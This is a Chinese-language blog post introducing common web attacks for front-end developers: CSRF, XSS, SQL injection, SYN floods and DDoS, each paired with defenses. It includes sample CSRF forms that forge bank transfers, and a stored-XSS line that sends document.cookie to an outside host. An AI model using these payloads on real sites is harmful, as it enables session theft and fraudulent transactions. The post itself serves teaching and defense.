---
layout:     post
title:      "Web 网络安全基础知识"
date:       2016-03-09 12:00:00
author:     "Lindz"
header-img: "img/post-bg-os-metro.jpg"
tags:
    - 计算机网络
    - 网络安全
---

作为一个前端 er，掌握必要的网络安全知识是必要的，下面我整理了几种常见的网络攻击方式及防御技巧，本文内容来自网络，仅供参考。

## CSRF 攻击

### CSRF 概念

CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。

CSRF 可以简单理解为：**攻击者盗用了你的身份，以你的名义发送恶意请求**，容易造成个人隐私泄露以及财产安全。

### CSRF 原理

![](/assets/2016-03-09-web-security/1.jpg)

要完成一次 CSRF 攻击，受害者必须完成：

1. 登录受信任网站 A，并在本地生成 Cookie。
2. 在不登出A的情况下，访问危险网站 B。

案例：

场景1. 银行网站 A，它以 GET 
请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&money=1000

危险网站B，它里面有一段 HTML 的代码如下:

```html
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
```

首先，你登录了银行网站 A，然后访问危险网站 B，噢，这时你会发现你的银行账户少了 1000 块...  

原因是银行网站 A 违反了 HTTP 规范，使用 GET 请求更新资源。  

在访问危险网站B的之前，你已经登录了银行网站 A，而 B 中的 <img> 以 GET 的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站 A 的 Cookie 发出 Get 请求，去获取资源 “http://www.mybank.com/Transfer.php?toBankId=11&money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作......

情况2:  

银行决定把获取请求数据的方法也改了，改用 $_POST，只获取 POST 请求的数据，后台处理页面 Transfer.php 代码如下：

```php
<?php
	session_start();
	if (isset($_POST['toBankId'] &&isset($_POST['money']))
	{
		buy_stocks($_POST['toBankId'],　$_POST['money']);
	}
?>
```

然而，危险网站 B 与时俱进，它改了一下代码：

```html
<body onload="steal()">
	<iframe name="steal" display="none">
　　	<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
　　		<input type="hidden" name="toBankId" value="11">
　　		<input type="hidden" name="money" value="1000">
　　	</form>
　　</iframe>
</body>
```

因为这里危险网站B暗地里发送了 POST 请求到银行，通过一个隐藏的自动提交的表单来提交请求，


##### 其实可以看出，CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！


### CSRF 防御

CSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。

1. 关键操作只接受 POST 请求  

2. 验证码：    
CSRF 攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了 CSRF 攻击。  
但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用。

3. 检测 Referer：  
常见的互联网页面与页面之间是存在联系的，比如你在 www.baidu.com 应该是找不到通往 www.google.com 的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的 Referer 中    
通过检查 Referer 的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到 Referer 的值，所以 Referer Check 一般用于监控 CSRF 攻击的发生，而不用来抵御攻击。

4. Token: 目前主流的做法是使用 Token 抵御 CSRF 攻击

CSRF 攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止 CSRF 攻击。

另一个更通用的做法是保持原有参数不变，另外添加一个参数 Token，其值是随机的。这样攻击者因为不知道 Token 而无法构造出合法的请求进行攻击。

Token 使用原则:

* Token 要足够随机————只有这样才算不可预测
* Token 是一次性的，即每次请求成功后要更新 Token————这样可以增加攻击难度，增加预测难度
* Token 要注意保密性————敏感操作使用 post，防止 Token 出现在 URL 中

**注意：过滤用户输入的内容不能阻挡 csrf，我们需要做的是过滤请求的来源。**

## XSS攻击

### XSS 概念

XSS 又称 CSS，全称 Cross SiteScript，跨站脚本攻击，为了和 CSS 层叠样式表区分所以取名 XSS，是 Web 程序中常见的漏洞。

其原理是攻击者向有 XS S漏洞的网站中输入(传入)恶意的 HTML 代码，当其它用户浏览该网站时，这段 HTML 代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。

例如：比如某论坛的评论功能没有对 XSS 进行过滤，那么我们可以对其进行评论，评论如下：

```javascript
while(true){
	alert(“你关不掉我")；
}
```

例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。

恶意者可以将上述代码修改成恶意的代码，就可以盗取你的 cookie 或者其它信息。

### XSS 攻击类型

#### DOM Based XSS

DOM Based XSS 是一种基于网页 DOM 结构的攻击，该攻击特点是中招的人是少数人。

恶意用户向单独用户发送恶意 JS 代码。

#### Stored XSS

Stored XSS 是存储式 XSS 漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。

example.com 可以发文章，我登录后在 example.com 中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时 Tom 和 Jack 看到了我发布的文章，当在查看我的文章时就都中招了，他们的 cookie 信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。

### 防御 XSS 攻击

理论上，网站上所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。防御 XSS 攻击最简单直接的方法，就是过滤用户的输入。

#### 方法一：

如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML escape 。下面一小段脚本：

```javascript
<script>window.location.href=”http://www.xss.com”;</script>
```

经过 escape 之后就成了：

```javascript
&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;
```

它现在会像普通文本一样显示出来，变得无毒无害，不能执行了。

#### 方法二：完善的过滤体系

永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。

#### 方法三：当用户需要输入 HTML 代码

当我们需要用户输入 HTML 的时候，需要对用户输入的内容做更加小心细致的处理。

仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。

更好的方法可能是，将用户的输入使用 HTML 解析库进行解析，获取其中的数据。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。

## SQL 注入

### 概念

所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。

具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。

### SQL 防护

1. 永远不要信任用户的输入:  
对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和
双"-"进行转换等。
	
2. 永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。

3. 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。

4. 不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。

## SYN 攻击

### 概念

在三次握手过程中，服务器发送 SYN-ACK 之后，收到客户端的 ACK 之前的 TCP 连接称为半连接(half-open connect)。此时服务器处于 SYN_RCVD 状态。当收到 ACK 后，服务器才能转入 ESTABLISHED 状态.

SYN 攻击指的是，攻击客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 SYN 包，服务器回复确认包，并等待客户的确认。

由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。

### 检测 SYN 攻击
 
检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源 IP 地址是随机的，基本上可以断定这是一次 SYN 攻击。

### SYN 攻击防护

1. 缩短超时（SYN Timeout）时间
2. 增加最大半连接数
3. 过滤网关防护

## DDOS攻击

### 概念

分布式拒绝服务( DDoS:Distributed Denial of Service )攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。

可以打个比方：

一群恶霸试图让对面那家有着竞争关系的商铺无法正常营业，他们会采取什么手段呢？（只为举例，切勿模仿）

恶霸们扮作普通客户一直拥挤在对手的商铺，赖着不走，真正的购物者却无法进入；或者总是和营业员有一搭没一搭的东扯西扯，让工作人员不能正常服务客户；也可以为商铺的经营者提供虚假信息，商铺的上上下下忙成一团之后却发现都是一场空，最终跑了真正的大客户，损失惨重。

此外恶霸们完成这些坏事有时凭单干难以完成，需要叫上很多人一起。嗯，网络安全领域中 DoS 和 DDoS 攻击就遵循着这些思路。

**DDOS 攻击利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。**

DDoS 攻击通过大量合法的请求占用大量网络资源，以达到瘫痪网络的目的。 具体有几种形式：

1. 通过使网络过载来干扰甚至阻断正常的网络通讯；
2. 通过向服务器提交大量请求，使服务器超负荷；
3. 阻断某一用户访问服务器；
4. 阻断某服务与特定系统或个人的通讯。

IP Spoofing:  
IP欺骗攻击是一种黑客通过向服务端发送虚假的包以欺骗服务器的DDOS攻击示意图DDOS攻击示意图做法。

具体说，就是将包中的源 IP 地址设置为不存在或不合法的值。服务器一旦接受到该包便会返回接受请求包，但实际上这个包永远返回不到来源处的计算机。这种做法使服务器必需开启自己的监听端口不断等待，也就浪费了系统各方面的资源。 

### DDOS 防御

1. 关闭不必要的服务
2. 限制同时打开的 Syn 半连接数目
3. 缩短Syn半连接的time out 时间

参考链接：

* [TCP 协议 笔试面试知识整理](http://hit-alibaba.github.io/interview/basic/network/TCP.html)
* [浅谈CSRF攻击方式 - hyddd - 博客园](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
* [分布式拒绝服务攻击 百度百科](http://baike.baidu.com/link?url=REctw71a-zdfpceJUYOVJRdapLLC7zz321lNEjpl_EMD4LW5D7X4_9vXYfUj_qqbWhfPj-CI0zWC4nlkbQZCIrG8GFYSbPJjSA1-NxwKBL8DUr2m5HU86iLB4AbEdhNJsWl7HqFt85b4pTDCQXPjzK)
* [sql注入 百度百科](http://baike.baidu.com/view/3896.htm)